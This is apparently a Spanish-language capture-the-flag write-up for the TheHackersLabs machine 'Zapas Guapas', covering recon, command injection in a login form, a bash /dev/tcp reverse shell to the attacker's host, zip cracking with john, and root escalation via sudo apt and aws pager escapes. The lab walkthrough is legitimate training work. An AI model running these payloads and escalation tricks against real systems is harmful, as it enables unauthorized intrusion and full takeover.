# Writeup — Zapas Guapas (TheHackersLabs)

**Plataforma:** TheHackersLabs  
**Sistema:** Debian 12  
**IP:** 10.10.10.8  
**Objetivo:** Obtener user.txt y root.txt

---

## 1. Reconocimiento

```bash
arp-scan -I eth0 --localnet
# Target: 10.10.10.8 (MAC Oracle VirtualBox)

nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.10.8 -oG all_ports.txt
nmap -p22,80 -sCV -vvv 10.10.10.8 -oN tcp_scan.txt
```

Puertos abiertos:
- **22/tcp** - OpenSSH 9.2p1 Debian
- **80/tcp** - Apache httpd 2.4.57 (Debian)

---

## 2. Fuzzing Web

```bash
feroxbuster -u http://10.10.10.8/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt -x php,txt,html
```

Archivos relevantes encontrados:
- `/login.html` - panel de login
- `/bin/` - entorno virtual Python expuesto
- `/nike.php`, `/air_max_plus.php`

---

## 3. Command Injection en login.html

El campo **password** de `login.html` ejecuta comandos y refleja la salida:

```
Usuario: test
Contraseña: cat /etc/passwd
```

Se descubren los usuarios del sistema:
- `proadidas` (uid=1001)
- `pronike` (uid=1002)

---

## 4. Reverse Shell como www-data

```bash
# Payload en campo password:
bash -c "bash -i >& /dev/tcp/10.10.10.3/4444 0>&1"

# Receptor:
nc -lvnp 4444
```

Obtenemos shell como `www-data`.

---

## 5. Enumeración y archivo importante.zip

```bash
www-data@zapasguapas:/home$ ls -l
drwxr-xr-x 3 proadidas proadidas ... proadidas
drwxr-xr-x 3 pronike   pronike   ... pronike

www-data@zapasguapas:/opt$ ls -l
-rw-r--r-- 1 proadidas proadidas 266 importante.zip
```

Se descarga el zip al equipo atacante montando un servidor HTTP temporal desde la víctima:

```bash
# En la máquina víctima (www-data):
www-data@zapasguapas:/opt$ python3 -m http.server 8080

# En la máquina atacante (kali):
wget http://10.10.10.8:8080/importante.zip
```

Se crackea el zip localmente:

```bash
zip2john importante.zip > hash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
# Password: hotstuff

unzip importante.zip
cat password.txt
# He conseguido la contraseña de pronike. Adidas FOREVER!!!!
# pronike11
```

---

## 6. SSH como pronike

```bash
ssh pronike@10.10.10.8  # pass: pronike11
```

---

## 7. Escalada pronike → proadidas

```bash
pronike@zapasguapas:/home/proadidas$ sudo -l
(proadidas) NOPASSWD: /usr/bin/apt
```

Técnica **GTFOBins** con `apt`:

```bash
sudo -u proadidas apt changelog apt
!/bin/bash
# Ya somos proadidas
```

---

## 8. Escalada proadidas → root

```bash
proadidas@zapasguapas:~$ sudo -l
(proadidas) NOPASSWD: /usr/bin/apt
(root) NOPASSWD: /usr/bin/aws
```

Técnica de **pager escape** con `aws help`:

```bash
sudo aws help
!/bin/bash
# Ya somos root
```

---

## 9. Flags

```bash
root@zapasguapas:/home/proadidas# cat user.txt
<REDACTED>

root@zapasguapas:/home/proadidas# cat /root/root.txt
<REDACTED>
```

---

**Resumen de la cadena de ataque:**

| Paso | Desde | Hacia | Método |
|------|-------|-------|--------|
| 1 | Internet | www-data | Command Injection en login.html |
| 2 | www-data | pronike | Crack de importante.zip (rockyou) |
| 3 | pronike | proadidas | `sudo apt` (GTFObins) |
| 4 | proadidas | root | `sudo aws help` (pager escape) |
